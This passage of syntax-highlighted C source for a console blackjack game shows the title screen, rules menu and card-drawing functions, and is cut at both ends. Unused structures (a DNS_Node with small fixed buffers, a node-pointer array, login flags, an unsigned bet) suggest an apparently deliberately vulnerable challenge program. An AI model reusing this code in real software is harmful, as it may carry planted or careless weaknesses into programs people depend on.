class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;                //Used for srand((unsigned) time(NULL)) command</span></span></span><br><span class="line"><span class="comment">//#include &lt;process.h&gt;             //Used for system("cls") command</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> spade 35                 <span class="comment">//Used to print spade symbol</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> club 36                 <span class="comment">//Used to print club symbol</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> diamond 37               <span class="comment">//Used to print diamond symbol</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> heart 38                 <span class="comment">//Used to print heart symbol</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RESULTS <span class="meta-string">"Blackjack.txt"</span>  <span class="comment">//File name is Blackjack</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WIN_SUM 65535 </span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DNS_Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> user[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">char</span> domain[<span class="number">0x30</span>];</span><br><span class="line"><span class="keyword">char</span> *ptr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Global Variables</span></span><br><span class="line"><span class="keyword">int</span> k;</span><br><span class="line"><span class="keyword">int</span> l;</span><br><span class="line"><span class="keyword">int</span> d;</span><br><span class="line"><span class="keyword">int</span> won;</span><br><span class="line"><span class="keyword">int</span> loss;</span><br><span class="line"><span class="keyword">int</span> cash = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> bet;</span><br><span class="line"><span class="keyword">int</span> random_card;</span><br><span class="line"><span class="keyword">int</span> player_total=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> dealer_total=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> * visitor_name ;</span><br><span class="line"><span class="keyword">int</span> login_flag=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> * motto=<span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DNS_Node</span> *<span class="title">DNS_Node_List</span>[0<span class="title">x20</span>];</span></span><br><span class="line"><span class="comment">//Function Prototypes</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">clubcard</span><span class="params">()</span></span>;      <span class="comment">//Displays Club Card Image</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">diamondcard</span><span class="params">()</span></span>;   <span class="comment">//Displays Diamond Card Image</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">heartcard</span><span class="params">()</span></span>;     <span class="comment">//Displays Heart Card Image</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spadecard</span><span class="params">()</span></span>;     <span class="comment">//Displays Spade Card Image</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">randcard</span><span class="params">()</span></span>;      <span class="comment">//Generates random card</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">betting</span><span class="params">()</span></span>;       <span class="comment">//Asks user amount to bet</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">asktitle</span><span class="params">()</span></span>;     <span class="comment">//Asks user to continue</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rules</span><span class="params">()</span></span>;        <span class="comment">//Prints "Rules of Vlad's Blackjack" menu</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>;         <span class="comment">//Plays game</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dealer</span><span class="params">()</span></span>;       <span class="comment">//Function to play for dealer AI</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stay</span><span class="params">()</span></span>;         <span class="comment">//Function for when user selects 'Stay'</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cash_test</span><span class="params">()</span></span>;    <span class="comment">//Test for if user has cash remaining in purse</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">askover</span><span class="params">()</span></span>;      <span class="comment">//Asks if user wants to continue playing</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fileresults</span><span class="params">()</span></span>;  <span class="comment">//Prints results into Blackjack.txt file in program directory</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Main Function</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">game</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> choice1;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"-*-*-*-*-*首家线上赌场上线了，性感泽哥女装发牌(・∀・)つ *-*-*-*-*-"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n              222                111                            "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n            222 222            11111                              "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n           222   222          11 111                            "</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n                222              111                               "</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n               222               111                           "</span>);   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n%c%c%c%c%c     %c%c            %c%c         %c%c%c%c%c    %c    %c                "</span>, club, club, club, club, club, spade, spade, diamond, diamond, heart, heart, heart, heart, heart, club, club);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n%c    %c    %c%c           %c  %c       %c     %c   %c   %c              "</span>, club, club, spade, spade, diamond, diamond, heart, heart, club, club);            </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n%c    %c    %c%c          %c    %c     %c          %c  %c               "</span>, club, club, spade, spade, diamond, diamond, heart, club, club);                        </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n%c%c%c%c%c     %c%c          %c %c%c %c     %c          %c %c              "</span>, club, club, club, club, club, spade, spade, diamond, diamond, diamond, diamond, heart, club, club);      </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n%c    %c    %c%c         %c %c%c%c%c %c    %c          %c%c %c             "</span>, club, club, spade, spade, diamond, diamond, diamond, diamond, diamond, diamond, heart, club, club, club);                       </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n%c     %c   %c%c         %c      %c    %c          %c   %c               "</span>, club, club, spade, spade, diamond, diamond, heart, club, club);                                         </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n%c     %c   %c%c        %c        %c    %c     %c   %c    %c             "</span>, club, club, spade, spade, diamond, diamond, heart, heart, club, club);                                                            </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n%c%c%c%c%c%c    %c%c%c%c%c%c%c   %c        %c     %c%c%c%c%c    %c     %c            "</span>, club, club, club, club, club, club, spade, spade, spade, spade, spade, spade, spade, diamond, diamond, heart, heart, heart, heart, heart, club, club);                                                                                     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n                        21                                   "</span>);</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n     %c%c%c%c%c%c%c%c      %c%c         %c%c%c%c%c    %c    %c                "</span>, diamond, diamond, diamond, diamond, diamond, diamond, diamond, diamond, heart, heart, club, club, club, club, club, spade, spade);                     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n        %c%c        %c  %c       %c     %c   %c   %c              "</span>, diamond, diamond, heart, heart, club, club, spade, spade);                                      </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n        %c%c       %c    %c     %c          %c  %c               "</span>, diamond, diamond, heart, heart, club, spade, spade);                                           </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n        %c%c       %c %c%c %c     %c          %c %c              "</span>, diamond, diamond, heart, heart, heart, heart, club, spade, spade);                                     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n        %c%c      %c %c%c%c%c %c    %c          %c%c %c             "</span>, diamond, diamond, heart, heart, heart, heart, heart, heart, club, spade, spade, spade);                                                </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n        %c%c      %c      %c    %c          %c   %c               "</span>, diamond, diamond, heart, heart, club, spade, spade);                                                                               </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n     %c  %c%c     %c        %c    %c     %c   %c    %c             "</span>, diamond, diamond, diamond, heart, heart, club, spade, spade);                                                                                                               </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n      %c%c%c      %c        %c     %c%c%c%c%c    %c     %c            "</span>, diamond, diamond, diamond, heart, heart, club, club, club, club, club, spade, spade);                                                                                                                                        </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n         222                     111                         "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n        222                      111                         "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n       222                       111                         "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n      222222222222222      111111111111111                       "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n      2222222222222222    11111111111111111                         "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"-*-*-*-*-*首家线上赌场上线了，性感泽哥女装发牌(・∀・)つ *-*-*-*-*-"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">     </span><br><span class="line">    asktitle();</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="comment">//system("pause");</span></span><br><span class="line">    <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125; <span class="comment">//end program</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">asktitle</span><span class="params">()</span> <span class="comment">// Function for asking player if they want to continue</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> choice1;</span><br><span class="line">    <span class="keyword">int</span> choice2;</span><br><span class="line">     </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n                 Are You Ready?"</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n                ----------------"</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n                      (Y/N)\n                        "</span>);</span><br><span class="line">     <span class="built_in">scanf</span>(<span class="string">"\n%c"</span>,&amp;choice1);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span>((choice1!=<span class="string">'Y'</span>) &amp;&amp; (choice1!=<span class="string">'y'</span>) &amp;&amp; (choice1!=<span class="string">'N'</span>) &amp;&amp; (choice1!=<span class="string">'n'</span>)) <span class="comment">// If invalid choice entered</span></span><br><span class="line">    &#123;                                                                           </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Incorrect Choice. Please Enter Y for Yes or N for No.\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%c"</span>,&amp;choice1);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>((choice1 == <span class="string">'Y'</span>) || (choice1 == <span class="string">'y'</span>)) <span class="comment">// If yes, continue. Prints menu.</span></span><br><span class="line">    &#123; </span><br><span class="line">            <span class="comment">//system("clear");</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\nEnter 1 to Begin the Greatest Game Ever Played."</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\nEnter 2 to See a Complete Listing of Rules."</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\nEnter 3 to Exit Game. (Not Recommended)"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\nChoice: "</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choice2); <span class="comment">// Prompts user for choice</span></span><br><span class="line">            <span class="keyword">if</span>((choice2&lt;<span class="number">1</span>) || (choice2&gt;<span class="number">3</span>)) <span class="comment">// If invalid choice entered</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"\nIncorrect Choice. Please enter 1, 2 or 3\n"</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choice2);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">switch</span>(choice2) <span class="comment">// Switch case for different choices</span></span><br><span class="line">            &#123;   </span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">// Case to begin game</span></span><br><span class="line">                  <span class="comment">// system("clear");</span></span><br><span class="line">                    </span><br><span class="line">                   play();</span><br><span class="line">                                       </span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>: <span class="comment">// Case to see rules</span></span><br><span class="line">                 <span class="comment">//  system("clear");</span></span><br><span class="line">                   rules();</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>: <span class="comment">// Case to exit game</span></span><br><span class="line">                   <span class="built_in">printf</span>(<span class="string">"\nYour day could have been perfect."</span>);</span><br><span class="line">                   <span class="built_in">printf</span>(<span class="string">"\nHave an almost perfect day!\n\n"</span>);</span><br><span class="line">                   <span class="comment">//system("pause");</span></span><br><span class="line">                   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                   <span class="built_in">printf</span>(<span class="string">"\nInvalid Input"</span>);</span><br><span class="line">            &#125; <span class="comment">// End switch case</span></span><br><span class="line">    &#125; <span class="comment">// End if loop</span></span><br><span class="line">    </span><br><span class="line">             </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((choice1 == <span class="string">'N'</span>) || (choice1 == <span class="string">'n'</span>)) <span class="comment">// If no, exit program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nYour day could have been perfect."</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nHave an almost perfect day!\n\n"</span>);</span><br><span class="line">        <span class="comment">//system("pause");</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="comment">// End function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rules</span><span class="params">()</span> <span class="comment">//Prints "Rules of Vlad's Blackjack" list</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">char</span> choice1;</span><br><span class="line">     <span class="keyword">int</span> choice2;</span><br><span class="line">      </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n           RULES of VLAD's BLACKJACK"</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n          ---------------------------"</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nI."</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n     Thou shalt not question the odds of this game."</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n      %c This program generates cards at random."</span>, spade);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n      %c If you keep losing, you are very unlucky!\n"</span>, diamond);</span><br><span class="line">      </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nII."</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n     Each card has a value."</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n      %c Number cards 1 to 10 hold a value of their number."</span>, spade);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n      %c J, Q, and K cards hold a value of 10."</span>, diamond);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n      %c Ace cards hold a value of 11"</span>, club);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n     The goal of this game is to reach a card value total of 21.\n"</span>);</span><br><span class="line">      </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nIII."</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n     After the dealing of the first two cards, YOU must decide whether to HIT or STAY."</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n      %c Staying will keep you safe, hitting will add a card."</span>, spade);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n     Because you are competing against the dealer, you must beat his hand."</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n     BUT BEWARE!."</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n      %c If your total goes over 21, you will LOSE!."</span>, diamond);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n%c%c%c YOUR RESULTS ARE RECORDED AND FOUND IN SAME FOLDER AS PROGRAM %c%c%c\n"</span>, spade, heart, club, club, heart, spade);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nWould you like to go the previous screen? (I will not take NO for an answer)"</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n                  (Y/N)\n                    "</span>);</span><br><span class="line">     <span class="built_in">scanf</span>(<span class="string">"\n%c"</span>,&amp;choice1);</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">while</span>((choice1!=<span class="string">'Y'</span>) &amp;&amp; (choice1!=<span class="string">'y'</span>) &amp;&amp; (choice1!=<span class="string">'N'</span>) &amp;&amp; (choice1!=<span class="string">'n'</span>)) <span class="comment">// If invalid choice entered</span></span><br><span class="line">    &#123;                                                                           </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Incorrect Choice. Please Enter Y for Yes or N for No.\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%c"</span>,&amp;choice1);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>((choice1 == <span class="string">'Y'</span>) || (choice1 == <span class="string">'y'</span>)) <span class="comment">// If yes, continue. Prints menu.</span></span><br><span class="line">    &#123; </span><br><span class="line">         <span class="comment">//   system("clear");</span></span><br><span class="line">            asktitle();</span><br><span class="line">    &#125; <span class="comment">// End if loop</span></span><br><span class="line">    </span><br><span class="line">             </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((choice1 == <span class="string">'N'</span>) || (choice1 == <span class="string">'n'</span>)) <span class="comment">// If no, convinces user to enter yes</span></span><br><span class="line">    &#123;</span><br><span class="line">       <span class="comment">// system("clear");</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n                 I told you so.\n"</span>);</span><br><span class="line">        asktitle();</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="comment">// End function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">clubcard</span><span class="params">()</span> <span class="comment">//Displays Club Card Image</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    <span class="comment">//srand((unsigned) time(NULL)); //Generates random seed for rand() function</span></span><br><span class="line">    k=rand()%<span class="number">13</span>+<span class="number">1</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k&lt;=<span class="number">9</span>) <span class="comment">//If random number is 9 or less, print card with that number</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Club Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  %d  |\n"</span>, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">10</span>) <span class="comment">//If random number is 10, print card with J (Jack) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Club Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  J  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">11</span>) <span class="comment">//If random number is 11, print card with A (Ace) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Club Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  A  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="keyword">if</span>(player_total&lt;=<span class="number">10</span>) <span class="comment">//If random number is Ace, change value to 11 or 1 depending on dealer total</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">11</span>;</span><br><span class="line">         &#125;</span><br><span class="line">          </span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line"> </span><br><span class="line">             k=<span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">12</span>) <span class="comment">//If random number is 12, print card with Q (Queen) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Club Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  Q  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">13</span>) <span class="comment">//If random number is 13, print card with K (King) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Club Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  K  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> k;           </span><br><span class="line">&#125;<span class="comment">// End function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">diamondcard</span><span class="params">()</span> <span class="comment">//Displays Diamond Card Image</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    <span class="comment">//srand((unsigned) time(NULL)); //Generates random seed for rand() function</span></span><br><span class="line">    k=rand()%<span class="number">13</span>+<span class="number">1</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k&lt;=<span class="number">9</span>) <span class="comment">//If random number is 9 or less, print card with that number</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Diamond Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  %d  |\n"</span>, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">10</span>) <span class="comment">//If random number is 10, print card with J (Jack) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Diamond Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  J  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">11</span>) <span class="comment">//If random number is 11, print card with A (Ace) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Diamond Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  A  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="keyword">if</span>(player_total&lt;=<span class="number">10</span>) <span class="comment">//If random number is Ace, change value to 11 or 1 depending on dealer total</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">11</span>;</span><br><span class="line">         &#125;</span><br><span class="line">          </span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">12</span>) <span class="comment">//If random number is 12, print card with Q (Queen) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Diamond Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  Q  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span 